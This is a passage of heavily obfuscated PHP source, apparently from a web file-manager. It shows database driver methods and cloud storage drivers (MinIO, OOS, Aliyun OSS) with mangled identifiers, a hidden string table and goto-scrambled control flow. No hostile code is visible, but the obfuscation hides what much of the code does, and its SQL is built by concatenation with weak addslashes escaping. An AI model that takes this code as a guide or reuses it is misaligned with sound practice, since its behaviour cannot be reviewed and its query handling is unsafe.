(bool) (isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[99]]) && $F®Ÿë²ß¨²[$bâ¬òç«Ø[99]] === $bâ¬òç«Ø[33] || isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[31]]) && $F®Ÿë²ß¨²[$bâ¬òç«Ø[31]] === $bâ¬òç«Ø[33]), $bâ¬òç«Ø[34] => isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[34]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[34]] : (isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[53]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[53]] : $bâ¬òç«Ø[361]), $bâ¬òç«Ø[36] => isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[89]]) ? strtolower($F®Ÿë²ß¨²[$bâ¬òç«Ø[89]]) == $bâ¬òç«Ø[38] : (isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[54]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[54]] : !1), $bâ¬òç«Ø[39] => isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[846]]) ? strtolower($F®Ÿë²ß¨²[$bâ¬òç«Ø[846]]) == $bâ¬òç«Ø[41] : (isset($F®Ÿë²ß¨²[$bâ¬òç«Ø[89]]) ? $F®Ÿë²ß¨²[$bâ¬òç«Ø[89]] : !1)); } } goto aÌ¹îèëè; F°Ø¦ÜºğŞ: $bâ¬òç«Ø =& $_SERVER[í™]; $this->initConnect(!0); if (think_config($bâ¬òç«Ø[830])) { $Cáˆ‰„–Œ = str_replace($bâ¬òç«Ø[831], $F¯†Ëä‘½ã, think_config($bâ¬òç«Ø[830])); } else { switch ($this->dbType) { case $bâ¬òç«Ø[814]: case $bâ¬òç«Ø[832]: $Cáˆ‰„–Œ = "\x53\105\x4c\x45\x43\x54\x20\x20\40\143\x6f\154\165\x6d\156\137\x6e\141\x6d\x65\x20\141\163\40\x27\x4e\x61\x6d\145\x27\54\40\40\x20\x64\x61\164\141\x5f\164\171\160\x65\40\x61\163\40\47\x54\x79\x70\145\x27\x2c\40\40\40\143\157\154\x75\155\x6e\137\x64\x65\x66\x61\165\154\164\x20\x61\163\x20\x27\x44\x65\x66\141\x75\x6c\x74\47\x2c\x20\x20\x20\151\x73\x5f\x6e\x75\154\x6c\141\x62\x6c\145\40\x61\163\40\47\116\165\154\154\x27\xa\x9\11\106\x52\x4f\115\11\x69\x6e\x66\x6f\162\155\141\x74\151\157\156\137\x73\143\150\145\155\x61\x2e\x74\x61\x62\x6c\x65\x73\40\x41\x53\x20\164\12\11\11\112\117\111\116\11\x69\x6e\x66\x6f\162\155\x61\164\151\x6f\x6e\137\163\143\150\145\x6d\x61\56\x63\x6f\154\x75\x6d\x6e\163\40\x41\x53\x20\143\12\11\x9\x4f\116\40\x20\x74\56\164\x61\142\154\145\137\143\141\164\141\x6c\157\x67\40\75\40\x63\x2e\x74\141\x62\x6c\145\x5f\x63\141\x74\x61\x6c\157\x67\12\11\x9\101\x4e\x44\40\x74\56\x74\x61\142\x6c\x65\137\x73\143\150\x65\x6d\x61\40\75\40\143\56\164\x61\x62\154\x65\x5f\163\143\x68\145\155\141\12\11\11\101\116\x44\x20\164\x2e\x74\x61\142\x6c\145\137\x6e\x61\155\x65\x20\x3d\x20\x63\x2e\164\141\142\x6c\145\x5f\156\141\155\145\12\11\x9\127\x48\105\122\105\40\x20\40\x74\56\164\141\142\154\x65\x5f\156\141\x6d\x65\x20\x3d\40\47{$F¯†Ëä‘½ã}\47"; break; case $bâ¬òç«Ø[833]: $Cáˆ‰„–Œ = $bâ¬òç«Ø[834] . $F¯†Ëä‘½ã . $bâ¬òç«Ø[835]; break; case $bâ¬òç«Ø[815]: case $bâ¬òç«Ø[817]: $Cáˆ‰„–Œ = $bâ¬òç«Ø[836] . $bâ¬òç«Ø[837] . $bâ¬òç«Ø[838] . strtoupper($F¯†Ëä‘½ã) . $bâ¬òç«Ø[839] . strtoupper($F¯†Ëä‘½ã) . $bâ¬òç«Ø[840]; break; case $bâ¬òç«Ø[841]: $Cáˆ‰„–Œ = $bâ¬òç«Ø[842] . $F¯†Ëä‘½ã . $bâ¬òç«Ø[843]; break; case $bâ¬òç«Ø[816]: break; case $bâ¬òç«Ø[844]: default: $Cáˆ‰„–Œ = $bâ¬òç«Ø[845] . ($this->dbType == $bâ¬òç«Ø[844] ? "\140{$F¯†Ëä‘½ã}\x60" : $F¯†Ëä‘½ã); } } goto D´¶µÙõŠ¤; dóÑ¤œŸË‹: } public function getTables($fôƒô–”× = '') { $dÓ­é¬¥ =& $_SERVER[í™]; if (think_config($dÓ­é¬¥[847])) { $E¹ÕŠÄ’ô = str_replace($dÓ­é¬¥[848], $fôƒô–”×, think_config($dÓ­é¬¥[847])); } else { switch ($this->dbType) { case $dÓ­é¬¥[815]: case $dÓ­é¬¥[817]: $E¹ÕŠÄ’ô = $dÓ­é¬¥[849]; break; case $dÓ­é¬¥[814]: case $dÓ­é¬¥[832]: $E¹ÕŠÄ’ô = $dÓ­é¬¥[850]; break; case $dÓ­é¬¥[841]: $E¹ÕŠÄ’ô = $dÓ­é¬¥[851]; break; case $dÓ­é¬¥[816]: think_exception(think_lang($dÓ­é¬¥[852]) . $dÓ­é¬¥[853]); break; case $dÓ­é¬¥[833]: $E¹ÕŠÄ’ô = $dÓ­é¬¥[42] . $dÓ­é¬¥[43] . $dÓ­é¬¥[44]; break; case $dÓ­é¬¥[844]: default: if (!empty($fôƒô–”×)) { $E¹ÕŠÄ’ô = $dÓ­é¬¥[797] . $fôƒô–”×; } else { $E¹ÕŠÄ’ô = $dÓ­é¬¥[798]; } } } $DÄôÈœì = $this->query($E¹ÕŠÄ’ô); $Cóõæâæ§ = array(); foreach ($DÄôÈœì as $F—ƒ¦¢‰°ã => $C‘­à¯²É¼) { $Cóõæâæ§[$F—ƒ¦¢‰°ã] = current($C‘­à¯²É¼); } return $Cóõæâæ§; } protected function parseLimit($EÓÒ„Ê¥½¸) { $a¸ÌôÈ·èÕ =& $_SERVER[í™]; $BËğÄÚç¯Ç = $a¸ÌôÈ·èÕ[33]; if (!empty($EÓÒ„Ê¥½¸)) { switch ($this->dbType) { case $a¸ÌôÈ·èÕ[841]: case $a¸ÌôÈ·èÕ[833]: $EÓÒ„Ê¥½¸ = explode($a¸ÌôÈ·èÕ[47], $EÓÒ„Ê¥½¸); if (count($EÓÒ„Ê¥½¸) > 1) { $BËğÄÚç¯Ç .= $a¸ÌôÈ·èÕ[48] . $EÓÒ„Ê¥½¸[1] . $a¸ÌôÈ·èÕ[49] . $EÓÒ„Ê¥½¸[0] . $a¸ÌôÈ·èÕ[50]; } else { $BËğÄÚç¯Ç .= $a¸ÌôÈ·èÕ[48] . $EÓÒ„Ê¥½¸[0] . $a¸ÌôÈ·èÕ[50]; } break; case $a¸ÌôÈ·èÕ[814]: case $a¸ÌôÈ·èÕ[832]: break; case $a¸ÌôÈ·èÕ[816]: break; case $a¸ÌôÈ·èÕ[815]: case $a¸ÌôÈ·èÕ[817]: break; case $a¸ÌôÈ·èÕ[844]: default: $BËğÄÚç¯Ç .= $a¸ÌôÈ·èÕ[48] . $EÓÒ„Ê¥½¸ . $a¸ÌôÈ·èÕ[50]; } } return $BËğÄÚç¯Ç; } public function parseKey(&$a«µ™Œ¡ï, $d“Ù¬•§å = true) { $dé‹¢›‹â =& $_SERVER[í™]; if ($d“Ù¬•§å) { $a«µ™Œ¡ï = $this->parseKeyCheck($a«µ™Œ¡ï); } if ($this->dbType == $dé‹¢›‹â[844]) { if ($a«µ™Œ¡ï != $dé‹¢›‹â[176] && !preg_match($dé‹¢›‹â[808], $a«µ™Œ¡ï)) { $a«µ™Œ¡ï = $dé‹¢›‹â[809] . trim($a«µ™Œ¡ï, $dé‹¢›‹â[809]) . $dé‹¢›‹â[809]; } return $a«µ™Œ¡ï; } else { return parent::parseKey($a«µ™Œ¡ï); } } public function close() { $this->_linkID = null; } public function error() { $AÌ‡™¦ßÜ¢ =& $_SERVER[í™]; if ($this->PDOStatement) { $BĞ¬œ—š´î = $this->PDOStatement->errorInfo(); $this->error = $BĞ¬œ—š´î[1] . $AÌ‡™¦ßÜ¢[4] . $BĞ¬œ—š´î[2]; } else { $this->error = $AÌ‡™¦ßÜ¢[33]; } if ($AÌ‡™¦ßÜ¢[33] != $this->queryStr) { $this->error .= LNG($AÌ‡™¦ßÜ¢[45]) . $this->queryStr; } think_trace($this->error, $AÌ‡™¦ßÜ¢[33], $AÌ‡™¦ßÜ¢[46]); return $this->error; } public function escapeString($FÓ­‡ÃÌåñ) { $a‡áƒÁÌÂÉ =& $_SERVER[í™]; switch ($this->dbType) { case $a‡áƒÁÌÂÉ[841]: case $a‡áƒÁÌÂÉ[814]: case $a‡áƒÁÌÂÉ[832]: case $a‡áƒÁÌÂÉ[844]: return addslashes($FÓ­‡ÃÌåñ); case $a‡áƒÁÌÂÉ[816]: case $a‡áƒÁÌÂÉ[833]: case $a‡áƒÁÌÂÉ[815]: case $a‡áƒÁÌÂÉ[817]: return str_ireplace($a‡áƒÁÌÂÉ[55], $a‡áƒÁÌÂÉ[56], $FÓ­‡ÃÌåñ); } } protected function parseValue($a†ÊŠƒëîè) { $F•»‘İ±ğé =& $_SERVER[í™]; if (is_string($a†ÊŠƒëîè)) { $a†ÊŠƒëîè = strpos($a†ÊŠƒëîè, $F•»‘İ±ğé[4]) === 0 ? $this->escapeString($a†ÊŠƒëîè) : $F•»‘İ±ğé[854] . $this->escapeString($a†ÊŠƒëîè) . $F•»‘İ±ğé[854]; } elseif (isset($a†ÊŠƒëîè[0]) && is_string($a†ÊŠƒëîè[0]) && strtolower($a†ÊŠƒëîè[0]) == $F•»‘İ±ğé[285]) { $a†ÊŠƒëîè = $this->escapeString($a†ÊŠƒëîè[1]); } elseif (is_array($a†ÊŠƒëîè)) { $a†ÊŠƒëîè = array_map(array($this, $F•»‘İ±ğé[855]), $a†ÊŠƒëîè); } elseif (is_bool($a†ÊŠƒëîè)) { $a†ÊŠƒëîè = $a†ÊŠƒëîè ? $F•»‘İ±ğé[83] : $F•»‘İ±ğé[470]; } elseif (is_null($a†ÊŠƒëîè)) { $a†ÊŠƒëîè = $F•»‘İ±ğé[99]; } return $a†ÊŠƒëîè; } public function getLastInsertId() { $e”ìÇ„ö =& $_SERVER[í™]; switch ($this->dbType) { case $e”ìÇ„ö[841]: case $e”ìÇ„ö[833]: case $e”ìÇ„ö[814]: case $e”ìÇ„ö[832]: case $e”ìÇ„ö[816]: case $e”ìÇ„ö[844]: return $this->_linkID->lastInsertId(); case $e”ìÇ„ö[815]: case $e”ìÇ„ö[817]: $AùòÕ·Ä¶ = $this->table; $c‡‡Æì•¦ = $this->query("\123\105\x4c\105\103\124\40{$AùòÕ·Ä¶}\x2e\x63\165\x72\x72\x76\141\154\40\143\x75\162\x72\166\141\x6c\x20\106\x52\x4f\x4d\40\144\x75\141\154"); return $c‡‡Æì•¦ ? $c‡‡Æì•¦[0][$e”ìÇ„ö[856]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($AÔˆ”¬ „) { goto Eóæ·Æòä›; EÓâŒ˜‡åõ: fclose($EßŞ¨‚Å•Í); show_json($C»¼™Çº¹À[859], !1); return !1; goto eÓŒù…ºïÑ; Eóæ·Æòä›: $C»¼™Çº¹À =& $_SERVER[í™]; $B¬åƒŠËµ = DATA_PATH . $C»¼™Çº¹À[857]; $EßŞ¨‚Å•Í = fopen($B¬åƒŠËµ, $C»¼™Çº¹À[858]); goto eº´ë´‹ç˜; eº´ë´‹ç˜: if (!$EßŞ¨‚Å•Í) { return !1; } if (flock($EßŞ¨‚Å•Í, LOCK_EX)) { $eö…ËãÏÙè = parent::query($AÔˆ”¬ „); flock($EßŞ¨‚Å•Í, LOCK_UN); fclose($EßŞ¨‚Å•Í); return $eö…ËãÏÙè; } flock($EßŞ¨‚Å•Í, LOCK_UN); goto EÓâŒ˜‡åõ; eÓŒù…ºïÑ: } public function execute($CÎâ¿ˆäÆ—) { goto dÎ‡—œ ·°; a÷Œ´øÖ©ï: fclose($EêÚ†«à¦®); show_json($EÁîŠÅİ‡¬[859], !1); return !1; goto Eé˜Ù®´ÙÎ; Cª·½…Ä‹¶: if (!$EêÚ†«à¦®) { return !1; } if (flock($EêÚ†«à¦®, LOCK_EX)) { $d§¾‰àµ™Î = parent::execute($CÎâ¿ˆäÆ—); flock($EêÚ†«à¦®, LOCK_UN); fclose($EêÚ†«à¦®); return $d§¾‰àµ™Î; } flock($EêÚ†«à¦®, LOCK_UN); goto a÷Œ´øÖ©ï; dÎ‡—œ ·°: $EÁîŠÅİ‡¬ =& $_SERVER[í™]; $f–ÅŒ˜¯‹‚ = DATA_PATH . $EÁîŠÅİ‡¬[857]; $EêÚ†«à¦® = fopen($f–ÅŒ˜¯‹‚, $EÁîŠÅİ‡¬[858]); goto Cª·½…Ä‹¶; Eé˜Ù®´ÙÎ: } } goto c¦™î­­§Õ; d­„÷Õ›”Ğ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($dƒÀˆ„×ßì) { parent::__construct($dƒÀˆ„×ßì); $this->signatureVersion($_SERVER[í™][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d’ÜÄœİ¥×) { parent::__construct($d’ÜÄœİ¥×); $this->signatureVersion($_SERVER[í™][200]); } public function fileOutLink($b†ŸæùâŠ) { $eØá¾‰½ù =& $_SERVER[í™]; if (substr($b†ŸæùâŠ, 0, 7) == $eØá¾‰½ù[1101]) { $b†ŸæùâŠ = $eØá¾‰½ù[1102] . substr($b†ŸæùâŠ, 7); } header($eØá¾‰½ù[156] . $b†ŸæùâŠ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($f®Š”‡éÍ‘) { parent::__construct(); include_once SDK_DIR . $_SERVER[í™][1157]; $this->_init($f®Š”‡éÍ‘); } public function _init($FË…¸Ë”ËÖ) { foreach ($FË…¸Ë”ËÖ as $d‘ˆé²šÃ => $CùŒ®”¨±ö) { if (isset($this->{$d‘ˆé²šÃ})) { $this->{$d‘ˆé²šÃ} = $CùŒ®”¨±ö; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[í™][1158], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto F‹ÌØÇ°®Î; CöÀÈáÜ¿–: $E’ñ°Ïƒ÷˜->setMaxAgeSeconds(600); $E’ñ°Ïƒ÷˜->addExposeHeader($Cª¯ÓËîõ[1164]); $E’ñ°Ïƒ÷˜->addAllowedHeader($Cª¯ÓËîõ[1159]); goto aÀ™Š¾; aÀ™Š¾: $bÃ´Ø»£…->addRule($E’ñ°Ïƒ÷˜); try { $this->client->putBucketCors($this->bucket, $bÃ´Ø»£…); } catch (OSS\Core\OssException $AĞ«ËÜĞÄª) { return !1; } return !0; goto aÃŸ™ë„õÍ; C‰óÂĞÙ†¬: $E’ñ°Ïƒ÷˜->addAllowedOrigin($Cª¯ÓËîõ[1159]); $E’ñ°Ïƒ÷˜->addAllowedMethod($Cª¯ÓËîõ[1160]); $E’ñ°Ïƒ÷˜->addAllowedMethod($Cª¯ÓËîõ[1161]); goto BÚ¹îÍ´§¦; BÚ¹îÍ´§¦: $E’ñ°Ïƒ÷˜->addAllowedMethod($Cª¯ÓËîõ[1162]); $E’ñ°Ïƒ÷˜->addAllowedMethod($Cª¯ÓËîõ[1163]); $E’ñ°Ïƒ÷˜->addAllowedMethod($Cª¯ÓËîõ[155]); goto CöÀÈáÜ¿–; F‹ÌØÇ°®Î: $Cª¯ÓËîõ =& $_SERVER[í™]; $bÃ´Ø»£… = new OSS\Model\CorsConfig(); $E’ñ°Ïƒ÷˜ = new OSS\Model\CorsRule(); goto C‰óÂĞÙ†¬; aÃŸ™ë„õÍ: } public function getBucketCors() { goto a…çğµë‰Û; DÑ‰ŠŠ—··: return array($eƒÓÕÎ­[175] => isset($cìÕ³Û”Ä‰[0]) ? $cìÕ³Û”Ä‰[0] : $eƒÓÕÎ­[33], $eƒÓÕÎ­[179] => $D¹µ®»™²ï, $eƒÓÕÎ­[1165] => $A¦óøµ˜‹º, $eƒÓÕÎ­[1166] => isset($Cõƒ§Ú£ˆá[0]) ? $Cõƒ§Ú£ˆá[0] : $eƒÓÕÎ­[33], $eƒÓÕÎ­[177] => isset($BœÓ”œ¨Òˆ[0]) ? $BœÓ”œ¨Òˆ[0] : $eƒÓÕÎ­[33]); goto C¥÷âÚì¦¼; a…çğµë‰Û: $eƒÓÕÎ­ =& $_SERVER[í™]; $d‘£á‚ö = null; try { $d‘£á‚ö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $cÜÓÒÉ¾ÅŞ) { return null; } goto bÜ‰¬£ÏŸ¬; bÜ‰¬£ÏŸ¬: if (!$d‘£á‚ö || !($A‘†­Ì‹¢ = $d‘£á‚ö->getRules())) { return null; } $cìÕ³Û”Ä‰ = $A‘†­Ì‹¢[0]->getAllowedOrigins(); $D¹µ®»™²ï = $A‘†­Ì‹¢[0]->getAllowedMethods(); goto FÕäé¡‚Íƒ; FÕäé¡‚Íƒ: $A¦óøµ˜‹º = $A‘†­Ì‹¢[0]->getMaxAgeSeconds(); $Cõƒ§Ú£ˆá = $A‘†­Ì‹¢[0]->getExposeHeaders(); $BœÓ”œ¨Òˆ = $A‘†­Ì‹¢[0]->getAllowedHeaders(); goto DÑ‰ŠŠ—··; C¥÷âÚì¦¼: } public function isBucketCors() { goto D¥ÁÚ™¢Æ; E¥àÊ™Èœ: $a¦¶”˜Š× = array($CˆÔ¥î§¬[180], $CˆÔ¥î§¬[181], $CˆÔ¥î§¬[182], $CˆÔ¥î§¬[183], $CˆÔ¥î§¬[184]); $b³Ôâã˜ÉÛ = array_diff($a¦¶”˜Š×, $DªññÔÊª); return empty($b³Ôâã˜ÉÛ); goto CµÄ‰¢ö ¸; D¥ÁÚ™¢Æ: $CˆÔ¥î§¬ =& $_SERVER[í™]; $FïßïçîÄ» = $this->getBucketCors(); if (!$FïßïçîÄ» || !is_array($FïßïçîÄ»)) { return !1; } goto a®®³ç¾¢½; a®®³ç¾¢½: if ($FïßïçîÄ»[$CˆÔ¥î§¬[175]] != $CˆÔ¥î§¬[176] || $FïßïçîÄ»[$CˆÔ¥î§¬[177]] != $CˆÔ¥î§¬[176]) { return !1; } $DªññÔÊª = array_map($CˆÔ¥î§¬[178], $FïßïçîÄ»[$CˆÔ¥î§¬[179]]); if (!is_array($DªññÔÊª)) { $DªññÔÊª = array(); } goto E¥àÊ™Èœ; CµÄ‰¢ö ¸: } public function mkfile($d‡åˆÑò„ç, $CŞµ„ƒ¢ğ = '', $fÊ­“¯ØŸ = REPEAT_RENAME) { $D¡®µã§äŒ = $this->setContent($d‡åˆÑò„ç, $CŞµ„ƒ¢ğ); if ($D¡®µã§äŒ !== !1) { return $this->getPathOuter($d‡åˆÑò„ç); } return !1; } public function mkdir($a¬„¥šƒ™­, $C½‡É¯Âê‰ = REPEAT_SKIP) { if ($this->_isFolder($a¬„¥šƒ™­)) { return $this->getPathOuter($a¬„¥šƒ™­); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a¬„¥šƒ™­)); } catch (OSS\Core\OssException $eñ¾óï «š) { return !1; } return $this->getPathOuter($a¬„¥šƒ™­); } private function fileList($C–¹îÁîŞÃ, $fÁ³¾È—´ = '', $Eª¾º¿š©Ç = 0) { goto f‡ÍÔÍ‰ìù; fËÃ›˜ôŒÌ: while (!0) { $Dèª¼ÜîŒ = array($D¥õœáõ¾[1167] => $fÁ³¾È—´, $D¥õœáõ¾[186] => $a‡ëÛÅç½³, $D¥õœáõ¾[1168] => $Eª²¾¼ÅÜ, $D¥õœáõ¾[1169] => $cÆá «øæÀ); try { $AÊë­Ğ±Çä = $this->client->listObjects($this->bucket, $Dèª¼ÜîŒ); } catch (OSS\Core\OssException $AØåõ«ƒÚƒ) { break; } $cÆá «øæÀ = $AÊë­Ğ±Çä->getNextMarker(); $CÅõî‚¨®× = $AÊë­Ğ±Çä->getObjectList(); $DßÆÑ‚±Œ = $AÊë­Ğ±Çä->getPrefixList(); foreach ($CÅõî‚¨®× as $eƒôãÜÌ÷ª) { if ($eƒôãÜÌ÷ª->getKey() == $a‡ëÛÅç½³) { continue; } $fˆÇ¦±š = $eƒôãÜÌ÷ª->getKey(); if ($Eª¾º¿š©Ç) { $fˆÇ¦±š = array($D¥õœáõ¾[28] => $fˆÇ¦±š, $D¥õœáõ¾[77] => $eƒôãÜÌ÷ª->getSize(), $D¥õœáõ¾[190] => strtotime($eƒôãÜÌ÷ª->getLastModified())); } $A©©¶Á»£[] = $fˆÇ¦±š; } foreach ($DßÆÑ‚±Œ as $CïèœËİ¿²) { $a„Ùó¶¤é†[] = $CïèœËİ¿²->getPrefix(); } if ($cÆá «øæÀ === $D¥õœáõ¾[33]) { break; } } return array($D¥õœáõ¾[74] => $a„Ùó¶¤é†, $D¥õœáõ¾[73] => $A©©¶Á»£); goto eÏ™›ŠËÇß; f‡ÍÔÍ‰ìù: $D¥õœáõ¾ =& $_SERVER[í™]; $C–¹îÁîŞÃ = trim($C–¹îÁîŞÃ, $D¥õœáõ¾[8]); $a‡ëÛÅç½³ = empty($C–¹îÁîŞÃ) ? $D¥õœáõ¾[33] : $C–¹îÁîŞÃ . $D¥õœáõ¾[8]; goto FËí¢›®®°; FËí¢›®®°: $cÆá «øæÀ = $D¥õœáõ¾[33]; $Eª²¾¼ÅÜ = 1000; $a„Ùó¶¤é† = $A©©¶Á»£ = array(); goto fËÃ›˜ôŒÌ; eÏ™›ŠËÇß: } public function copyFile($Fù†‘ğË…÷, $c²™á“™î†) { $aˆğŒò©˜ = $this->size($Fù†‘ğË…÷); if ($aˆğŒò©˜ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Fù†‘ğË…÷, $this->bucket, $this->pathEncode($c²™á“™î†)); } catch (OSS\Core\OssException $càî˜¼³¥§) { return !1; } return $this->getPathOuter($c²™á“™î†); } $CÜ‹¼›†ñÒ = $this->multiCopyObject($Fù†‘ğË…÷, $c²™á“™î†, $aˆğŒò©˜); return $CÜ‹¼›†ñÒ ? $this->getPathOuter($c²™á“™î†) : !1; } private function multiCopyObject($c³ñƒİÏä‡, $aÌÅì™ª×Œ, $dø¶¤¤ßäË) { $D’šµ¾®¿å =& $_SERVER[í™]; try { goto D¤‚®§…Á; D¤‚®§…Á: $B¢«‹ÒïÆ— = array(); if ($C¼§°ì´ß = $this->hashMd5($c³ñƒİÏä‡)) { $B¢«‹ÒïÆ— = array(OSS\OssClient::OSS_HEADERS => array($D’šµ¾®¿å[1170] => $C¼§°ì´ß)); } $AÇ¡‘§‚ÊÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aÌÅì™ª×Œ), $B¢«‹ÒïÆ—); goto d©²£Ì¢Î; d©²£Ì¢Î: $BĞ±¨ÜÄ· = 1; $cë ‚ïÖî‡ = 0; $CŒ²Ñ†±ñ = array(); goto cßÂ×©Ë†‰; E½Ğô…›Ÿä: $cÅ¹°Âƒé¯ = array(); foreach ($CŒ²Ñ†±ñ as $FíÎ—‡Æ => $cäîÑÇ”) { $cÅ¹°Âƒé¯[] = array($D’šµ¾®¿å[1174] => $FíÎ—‡Æ + 1, $D’šµ¾®¿å[1175] => $cäîÑÇ”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aÌÅì™ª×Œ), $AÇ¡‘§‚ÊÆ, $cÅ¹°Âƒé¯); goto C¸õ¡¨£Ÿ; cßÂ×©Ë†‰: $a¡¯ÓÒ“Ù = 1024 * 1024 * 10; $céÜÂÙ­é = $this->client->generateMultiuploadParts($dø¶¤¤ßäË, $a¡¯ÓÒ“Ù); foreach ($céÜÂÙ­é as $FíÎ—‡Æ => $CŠÇÑ²‡¯„) { $eÃØ¬Í×Æ = $cë ‚ïÖî‡ + (int) $CŠÇÑ²‡¯„[$D’šµ¾®¿å[1171]]; $BÅèÀëç§Š = (int) $CŠÇÑ²‡¯„[$D’šµ¾®¿å[325]] + $eÃØ¬Í×Æ - 1; $AÇƒ¢¡å½œ = array($D’šµ¾®¿å[1172] => $eÃØ¬Í×Æ, $D’šµ¾®¿å[1173] => $BÅèÀëç§Š); $CŒ²Ñ†±ñ[] = $this->client->uploadPartCopy($this->bucket, $c³ñƒİÏä‡, $this->bucket, $this->pathEncode($aÌÅì™ª×Œ), $BĞ±¨ÜÄ·, $AÇ¡‘§‚ÊÆ, $AÇƒ¢¡å½œ); $BĞ±¨ÜÄ· = $BĞ±¨ÜÄ· + 1; } goto E½Ğô…›Ÿä; C¸õ¡¨£Ÿ: } catch (OSS\Core\OssException $CÚ…¸Â‰ªø) { return !1; } return !0; } public function moveFile($c™£ö½Ïİç, $B£†¹’ÄÙ) { if ($this->copyFile($c™£ö½Ïİç, $B£†¹’ÄÙ)) { $this->remove($c™£ö½Ïİç); return $this->getPathOuter($B£†¹’ÄÙ); } return !1; } public function delFile($B…¹¸”²) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($B…¹¸”²)); } catch (OSS\Core\OssException $Aù”ˆŒ¦»¤) { return !1; } return !0; } public function delFolder($c‰íò¹—Çº) { $B•°ª„ª¸‹ =& $_SERVER[í™]; $D—À‰‡‹¾¾ = $this->fileList($c‰íò¹—Çº); if (!empty($c‰íò¹—Çº) && !in_array(trim($c‰íò¹—Çº, $B•°ª„ª¸‹[8]) . $B•°ª„ª¸‹[8], $D—À‰‡‹¾¾[$B•°ª„ª¸‹[73]])) { $D—À‰‡‹¾¾[$B•°ª„ª¸‹[73]][] = trim($c‰íò¹—Çº, $B•°ª„ª¸‹[8]) . $B•°ª„ª¸‹[8]; } foreach (array_chunk($D—À‰‡‹¾¾[$B•°ª„ª¸‹[73]], 1000) as $Eà–ªÑÉáª) { try { $this->client->deleteObjects($this->bucket, $Eà–ªÑÉáª); } catch (OSS\Core\OssException $eÙÊ „“) { continue; } } return !0; } public function rename($e›‘ˆ‹Ó‡£, $cÑß·›â¦) { return $this->renameObject($e›‘ˆ‹Ó‡£, $cÑß·›â¦); } private function fileInfo($aÍ’êË§‚, $aÌŠë»â = array()) { goto A¬ÈÚ·ğ©; A¬ÈÚ·ğ©: $AöŠ¬‰‡Íù =& $_SERVER[í™]; $C‹‰è¡ÉÜƒ = array($AöŠ¬‰‡Íù[28] => $this->pathThis($aÍ’êË§‚), $AöŠ¬‰‡Íù[75] => $this->getPathOuter($aÍ’êË§‚), $AöŠ¬‰‡Íù[29] => $AöŠ¬‰‡Íù[167], $AöŠ¬‰‡Íù[187] => 0, $AöŠ¬‰‡Íù[107] => 0, $AöŠ¬‰‡Íù[77] => 0, $AöŠ¬‰‡Íù[160] => $this->ext($aÍ’êË§‚), $AöŠ¬‰‡Íù[188] => !0, $AöŠ¬‰‡Íù[189] => !0); if (empty($aÌŠë»â)) { $cøÜãƒ¸—õ = $this->objectMeta($aÍ’êË§‚); if (!$cøÜãƒ¸—õ) { return $C‹‰è¡ÉÜƒ; } $aÌŠë»â = array($AöŠ¬‰‡Íù[107] => strtotime($cøÜãƒ¸—õ[$AöŠ¬‰‡Íù[1176]]), $AöŠ¬‰‡Íù[77] => $cøÜãƒ¸—õ[$AöŠ¬‰‡Íù[1177]] + 0); } goto dÙ°ä›™¯‰; dÙ°ä›™¯‰: if (isset($aÌŠë»â[$AöŠ¬‰‡Íù[77]])) { $C‹‰è¡ÉÜƒ[$AöŠ¬‰‡Íù[77]] = $aÌŠë»â[$AöŠ¬‰‡Íù[77]]; } if (isset($aÌŠë»â[$AöŠ¬‰‡Íù[107]])) { $C‹‰è¡ÉÜƒ[$AöŠ¬‰‡Íù[107]] = $aÌŠë»â[$AöŠ¬‰‡Íù[107]]; } if (isset($aÌŠë»â[$AöŠ¬‰‡Íù[190]]) && !trim($C‹‰è¡ÉÜƒ[$AöŠ¬‰‡Íù[107]])) { $C‹‰è¡ÉÜƒ[$AöŠ¬‰‡Íù[107]] = $aÌŠë»â[$AöŠ¬‰‡Íù[190]]; } goto fééØê‘ÎŠ; fééØê‘ÎŠ: return $C‹‰è¡ÉÜƒ; goto A°Œ¸½ªº¯; A°Œ¸½ªº¯: } private function folderInfo($D–ÍÇœ–ëì, $FÅ“Ë†ÖŸ = array()) { $BéˆÒÖ¤ =& $_SERVER[í™]; $DªÎÕ›¯Ïñ = array($BéˆÒÖ¤[28] => $this->pathThis($D–ÍÇœ–ëì), $BéˆÒÖ¤[75] => $this->getPathOuter($BéˆÒÖ¤[8] . $D–ÍÇœ–ëì), $BéˆÒÖ¤[29] => $BéˆÒÖ¤[76], $BéˆÒÖ¤[187] => 0, $BéˆÒÖ¤[107] => 0, $BéˆÒÖ¤[188] => !0, $BéˆÒÖ¤[189] => !0); if (empty($FÅ“Ë†ÖŸ)) { $D–ÍÇœ–ëì = rtrim($D–ÍÇœ–ëì, $BéˆÒÖ¤[8]) . $BéˆÒÖ¤[8]; $EÇ§Äè”œÜ = $this->objectMeta($D–ÍÇœ–ëì); if (!$EÇ§Äè”œÜ) { return $DªÎÕ›¯Ïñ; } $FÅ“Ë†ÖŸ = array($BéˆÒÖ¤[187] => $EÇ§Äè”œÜ[$BéˆÒÖ¤[1178]][$BéˆÒÖ¤[1179]], $BéˆÒÖ¤[107] => 